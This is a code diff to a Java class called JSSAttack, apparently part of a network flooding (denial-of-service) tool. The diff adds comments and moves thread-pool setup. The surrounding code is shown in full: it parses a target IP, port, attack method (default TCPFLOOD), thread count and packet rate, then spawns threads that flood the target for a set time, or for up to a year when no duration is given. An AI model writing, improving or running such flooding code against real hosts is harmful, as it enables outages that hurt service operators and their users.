@@ -16,10 +16,16 @@ import java.util.concurrent.TimeUnit;
 @Getter
 @RequiredArgsConstructor
 public class JSSAttack implements Runnable {
-    public final TaskManager taskManager = new TaskManager();
     public final CommandLineParser parser;
     public boolean isDebug;
 
+    /**
+     * Returns the appropriate attack method based on the provided method, byte size, and attack statics.
+     * @param method the attack method
+     * @param byteSize the size of the attack in bytes
+     * @param attackStatics the attack statics
+     * @return the appropriate attack method
+     */
     @NotNull
     private static IAttackMethod getMethod(String method, Integer byteSize, AttackStatics attackStatics) {
         return switch (method) {
@@ -32,8 +38,12 @@ public class JSSAttack implements Runnable {
         };
     }
 
+    /**
+     * Runs the attack with the specified parameters.
+     */
     @SneakyThrows
     public void run() {
+        // Parse command line arguments
         this.isDebug = this.parser.get("--debug", Boolean.class, false);
         final String ip = this.parser.get("--ip", String.class, null);
         final Integer port = this.parser.get("--port", Integer.class, -1);
@@ -44,12 +54,14 @@ public class JSSAttack implements Runnable {
         final String method = this.parser.get("--method", String.class, "TCPFLOOD");
         final Boolean verbose = this.parser.get("--verbose", Boolean.class, false);
 
+        // Set logging level based on verbosity and debug mode
         if (verbose) {
             Logger.setCurrentLevel(Logger.LEVEL.VERBOSE);
         } else if (this.isDebug) {
             Logger.setCurrentLevel(Logger.LEVEL.DEBUG);
         }
 
+        // Log debug information if debug mode is enabled
         if (this.isDebug()) {
             Logger.setSection("DEBUG");
             Logger.log(Logger.LEVEL.INFO, "IP is: " + ip);
@@ -58,11 +70,16 @@ public class JSSAttack implements Runnable {
             Logger.log(Logger.LEVEL.INFO, "ByteSize is: " + byteSize);
         }
 
+        // Initialize task manager
+        TaskManager taskManager = new TaskManager(maxThreads);
+
+        // Initialize attack parameters
         final AttackStatics attackStatics = new AttackStatics(ppsLimit);
         final IAttackMethod attackMethod = getMethod(method, byteSize, attackStatics);
         final InetAddress addr = InetAddress.getByName(ip);
         final LocalTime endTime = LocalTime.now().plus(Duration.ofSeconds(duration));
 
+        // Start the attack and log thread creation
         Logger.setSection("ATTACK");
         for (int i = 0; i <= maxThreads; i++) {
             Logger.log(Logger.LEVEL.DEBUG, "Adding new thread. Max: " + maxThreads);
@@ -78,8 +95,10 @@ public class JSSAttack implements Runnable {
             });
         }
 
+        // Log start of attack
         Logger.log(Logger.LEVEL.INFO, "Attacking...");
 
+        // Add task to print attack statistics if verbose mode is enabled
         if (verbose) {
             taskManager.add(() -> {
                 while (LocalTime.now().isBefore(endTime)) {
@@ -93,6 +112,7 @@ public class JSSAttack implements Runnable {
             });
         }
 
+        // Perform attack for specified duration or indefinitely
         if (duration == -1) {
             taskManager.doTasks(TimeUnit.DAYS, 365);
             Logger.log(Logger.LEVEL.INFO, "Happy new year!");
